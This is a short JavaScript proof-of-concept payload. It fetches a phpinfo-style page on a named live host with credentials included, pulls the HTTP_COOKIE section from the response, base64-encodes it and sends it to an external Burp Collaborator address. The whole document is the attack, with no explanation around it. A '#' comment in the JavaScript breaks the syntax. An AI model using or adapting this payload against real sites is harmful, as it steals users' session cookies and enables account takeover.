var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'https://tatacars.sipradi.com.np/info.php';
req.withCredentials = true; // send cookie header
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
req2.open('GET', 'http://w851ykio035jlea5wjjoychoifoacz.burpcollaborator.net/?data=' + btoa(sess), false);
req2.send()
};
